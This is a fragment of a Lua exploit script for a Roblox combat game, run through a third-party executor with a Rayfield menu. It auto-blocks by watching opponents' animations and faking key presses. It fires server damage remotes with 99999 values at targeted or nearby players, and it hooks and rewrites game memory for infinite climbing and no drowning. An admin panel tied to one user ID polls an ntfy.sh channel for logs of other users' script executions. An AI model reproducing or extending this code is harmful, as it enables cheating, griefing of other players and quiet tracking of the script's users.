local movesFolder=ReplicatedStorage:WaitForChild("Animations"):WaitForChild("Moves")
local clientModulesFolder=player:WaitForChild("PlayerScripts"):WaitForChild("Client_Modules"):WaitForChild("Modules")
local handleInitiateC=ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("To_Client"):WaitForChild("Handle_Initiate_C")
local skillAnimationIds={} local skillAnimationNames={} local startupModuleNames={} local maxDistance=44 local handledTracks={} local handledSignals={} local isPressing=false
local function normalizeAnimationId(animationId) local value=tostring(animationId or "") return value:match("%d+") or "" end
local function cacheSkillAnimation(instance) if not instance:IsA("Animation") then return end local animationId=normalizeAnimationId(instance.AnimationId) if animationId~="" then skillAnimationIds[animationId]=true end local name=string.lower(instance.Name or "") if name~="" then skillAnimationNames[name]=true end end
local function cacheStartupModule(instance) if not instance:IsA("ModuleScript") then return end local name=string.lower(instance.Name or "") if name:find("startup",1,true) or name:match("start%d*$") then startupModuleNames[name]=true end end
for _,instance in ipairs(movesFolder:GetDescendants()) do cacheSkillAnimation(instance) end
table.insert(autoBlockConns,movesFolder.DescendantAdded:Connect(cacheSkillAnimation))
for _,instance in ipairs(clientModulesFolder:GetDescendants()) do cacheStartupModule(instance) end
table.insert(autoBlockConns,clientModulesFolder.DescendantAdded:Connect(cacheStartupModule))
local function isCharacterModel(instance) return instance and instance:IsA("Model") and instance:FindFirstChild("HumanoidRootPart") and instance:FindFirstChildOfClass("Humanoid") end
local function extractCharacter(value)
local valueType=typeof(value)
if valueType=="Instance" then if isCharacterModel(value) then return value end local model=value:FindFirstAncestorOfClass("Model") if isCharacterModel(model) then return model end elseif valueType=="table" then local character=rawget(value,"Character") or rawget(value,"character") if typeof(character)=="Instance" and isCharacterModel(character) then return character end for _,nestedValue in pairs(value) do local nestedCharacter=extractCharacter(nestedValue) if nestedCharacter then return nestedCharacter end end end end
local function isAbilityTrack(track) local animation=track.Animation if animation then local animationId=normalizeAnimationId(animation.AnimationId) if animationId~="" and skillAnimationIds[animationId] then return true end end local name=string.lower(track.Name or "") return name~="" and skillAnimationNames[name]==true end
local function getNearestEnemyCharacter(myRoot) local nearestCharacter=nil local nearestDistance=math.huge for _,enemy in ipairs(Players:GetPlayers()) do if enemy~=player then local enemyChar=enemy.Character local enemyRoot=enemyChar and enemyChar:FindFirstChild("HumanoidRootPart") local enemyHumanoid=enemyChar and enemyChar:FindFirstChildOfClass("Humanoid") if enemyRoot and enemyHumanoid and enemyHumanoid.Health>0 then local distance=(myRoot.Position-enemyRoot.Position).Magnitude if distance<nearestDistance then nearestDistance=distance nearestCharacter=enemyChar end end end end return nearestCharacter,nearestDistance end
local function press_F() if isPressing then return end isPressing=true task.spawn(function() pcall(function() vim:SendKeyEvent(true,Enum.KeyCode.F,false,game) task.wait(0.6) vim:SendKeyEvent(false,Enum.KeyCode.F,false,game) end) isPressing=false end) end
local function cleanupHandledTracks() for track in pairs(handledTracks) do local isPlaying=false pcall(function() isPlaying=track.IsPlaying end) if not isPlaying then handledTracks[track]=nil end end end
local function cleanupHandledSignals() local now=os.clock() for key,timestamp in pairs(handledSignals) do if now-timestamp>2 then handledSignals[key]=nil end end end
local function tryBlockNearestCharacter(sourceCharacter,signalName) if not sourceCharacter or sourceCharacter==player.Character then return end local character=player.Character local root=character and character:FindFirstChild("HumanoidRootPart") local sourceRoot=sourceCharacter:FindFirstChild("HumanoidRootPart") if not root or not sourceRoot then return end local nearestCharacter,nearestDistance=getNearestEnemyCharacter(root) if nearestCharacter~=sourceCharacter or nearestDistance>maxDistance then return end local signalKey=string.format("%s:%s",sourceCharacter:GetDebugId(),signalName) if handledSignals[signalKey] then return end handledSignals[signalKey]=os.clock() press_F() end
table.insert(autoBlockConns,handleInitiateC.OnClientEvent:Connect(function(signalName,...) local name=string.lower(tostring(signalName or "")) if not startupModuleNames[name] then return end local sourceCharacter=nil for index=1,select("#",...) do sourceCharacter=extractCharacter(select(index,...)) if sourceCharacter then break end end tryBlockNearestCharacter(sourceCharacter,name) end))
local co; co=task.spawn(function() while not scriptUnloaded and #autoBlockConns>0 do cleanupHandledTracks() cleanupHandledSignals() local character=player.Character local root=character and character:FindFirstChild("HumanoidRootPart") if not root then task.wait(0.010) continue end local nearestCharacter,nearestDistance=getNearestEnemyCharacter(root) if not nearestCharacter or nearestDistance>maxDistance then task.wait(0.010) continue end local nearestHumanoid=nearestCharacter:FindFirstChildOfClass("Humanoid") if not nearestHumanoid then task.wait(0.010) continue end for _,track in ipairs(nearestHumanoid:GetPlayingAnimationTracks()) do if isAbilityTrack(track) and not handledTracks[track] then handledTracks[track]=true press_F() break end end task.wait(0.010) end end)
end
})
AnotherTab:CreateParagraph({Title = "Description", Content = "\nReads animations and presses F before starting the animation of nearby players."})
if LocalPlayer.UserId == 2669200504 then
local AdminTab = Window:CreateTab("Admin", 0)
AdminTab:CreateSection("Execution Logs (Last 12h)")
local addedLogs = {}
AdminTab:CreateButton({
Name = "Refresh Logs",
Callback = function()
if not req then return end
task.spawn(function()
pcall(function()
local res=req({Url="https://ntfy.sh/Decro_Admin_Panel_Users_2669200504_XYZ987/json?poll=1&since=24h",Method="GET"})
if res and res.Body then
for _,line in ipairs(res.Body:split("\n")) do
if line~="" then
local s,d=pcall(function() return HttpService:JSONDecode(line) end)
if s and d and d.message and not addedLogs[d.message] then
addedLogs[d.message]=true
AdminTab:CreateButton({Name=d.message,Callback=function() pcall(function() if setclipboard then setclipboard(d.message) end end) end})
end
end
end
end
end)
end)
end
})
end
local function getClosestPlayerToTarget(selectedPlayerName)
local closestPlayer=nil
local closestDistance=math.huge
local myRoot=LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
if not myRoot then return nil end
for _,p in ipairs(Players:GetPlayers()) do
if p~=LocalPlayer and (not selectedPlayerName or p.Name:lower():find(selectedPlayerName:lower())) then
local char=p.Character
local root=char and char:FindFirstChild("HumanoidRootPart")
if root then
local dist=(root.Position-myRoot.Position).Magnitude
if dist<closestDistance then
closestDistance=dist
closestPlayer=p
end end end end return closestPlayer end
task.spawn(function()
while not scriptUnloaded do
if getgenv().TargetPlayersArrow or getgenv().AllArrow then
local char=LocalPlayer.Character
if char and char:FindFirstChild("HumanoidRootPart") then
pcall(function() game:GetService("ReplicatedStorage").Remotes.To_Server.Handle_Initiate_S_:InvokeServer("skil_ting_asd",LocalPlayer,"arrow_knock_back",5) end)
end task.wait(12) else task.wait(1) end end end)
task.spawn(function()
while not scriptUnloaded do
if getgenv().TargetPlayersArrow then
local char=LocalPlayer.Character
if char and char:FindFirstChild("HumanoidRootPart") then
local selectedStr=getgenv().selectedPlayerName or ""
local targets={}
for name in selectedStr:gmatch("[^,]+") do table.insert(targets,name:match("^%s*(.-)%s*$")) end
for _,targetName in ipairs(targets) do
if targetName~="" then
local closestPlayer=getClosestPlayerToTarget(targetName)
if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
for i=1,5 do
if scriptUnloaded then break end
pcall(function() game:GetService("ReplicatedStorage").Remotes.To_Server.Handle_Initiate_S:FireServer("arrow_knock_back_damage",char,closestPlayer.Character.HumanoidRootPart.CFrame,closestPlayer.Character,99999,99999) end)
task.wait(0.2)
end task.wait(1) end end end end end task.wait(0.1) end end)
task.spawn(function()
while not scriptUnloaded do
if getgenv().AllArrow then
local char=LocalPlayer.Character
if char and char:FindFirstChild("HumanoidRootPart") then
local closestPlayer=getClosestPlayerToTarget(nil)
if closestPlayer and closestPlayer.Character and closestPlayer.Character:FindFirstChild("HumanoidRootPart") then
pcall(function() game:GetService("ReplicatedStorage").Remotes.To_Server.Handle_Initiate_S:FireServer("arrow_knock_back_damage",char,closestPlayer.Character.HumanoidRootPart.CFrame,closestPlayer.Character,99999,99999) end)
task.wait(0.2)
end end end task.wait(0.1) end end)
task.spawn(function()
while not scriptUnloaded do
if getgenv().InfWarFans then
pcall(function() game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("war_Drums_remote"):FireServer(true) end)
task.wait(2) else task.wait(1) end end end)
task.spawn(function()
local weakSwimCache = setmetatable({}, {__mode = "v"})
local weakClimbCache = setmetatable({}, {__mode = "v"})
local hasScannedClimbHooks = false
local origCheckInstances = {}
while not scriptUnloaded do
if antiDrownEnabled then
local cachedS = weakSwimCache.t
if not cachedS then
pcall(function() for _,t in pairs(getgc(true)) do
if type(t)=="table" and rawget(t,"swim_bar") and type(rawget(t,"swim_bar"))=="table" and rawget(t,"max_swim_time") then
weakSwimCache.t=t cachedS=t break end end end) end
if cachedS and cachedS.swim_bar then cachedS.swim_bar[1]=cachedS.swim_bar[2] end
else weakSwimCache.t=nil end
if infinityClimbEnabled then
local cachedC = weakClimbCache.t
if not cachedC then
pcall(function() for _,v in pairs(getgc(true)) do
if type(v)=="table" and rawget(v,"Increment") and rawget(v,"Decrement") and rawget(v,"Max") then
weakClimbCache.t=v cachedC=v end
if not hasScannedClimbHooks and type(v)=="function" and not iscclosure(v) then
local s,consts=pcall(getconstants,v)
if s and (table.find(consts,"noclimb") or table.find(consts,"no climb")) then
local orig
orig=hookfunction(v,function(p1)
if infinityClimbEnabled then return true end
return orig(p1) end)
table.insert(origCheckInstances, orig)
end end end end)
hasScannedClimbHooks=true end
if cachedC and cachedC.Value and cachedC.Max then cachedC.Value=cachedC.Max end
else weakClimbCache.t=nil end
task.wait() end end)
LocalTab:CreateButton({
Name = "Unload UI",
Callback = function()
if scriptUnloaded then return end
scriptUnloaded = true
setESPEnabled(false)
Rayfield:Destroy()
end,
})
getgenv().__EvadeESPDebugUnload = function()
if scriptUnloaded then return end
scriptUnloaded = true
setESPEnabled(false)
Rayfield:Destroy()
end
